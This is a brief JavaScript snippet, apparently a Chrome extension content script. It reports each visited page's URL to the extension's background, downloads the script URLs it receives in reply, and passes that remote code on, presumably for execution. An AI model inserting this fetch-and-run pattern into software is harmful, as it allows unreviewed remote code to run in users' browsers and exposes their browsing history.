
chrome.extension.sendRequest({ url: location.href }, function (response) {
  response && response.forEach(function (oaakey) {
    $.get(oaakey.script, null, null, "text")
    .done(function (remoteCode) {
      chrome.extension.sendRequest({ code: remoteCode });
    })
  });
});
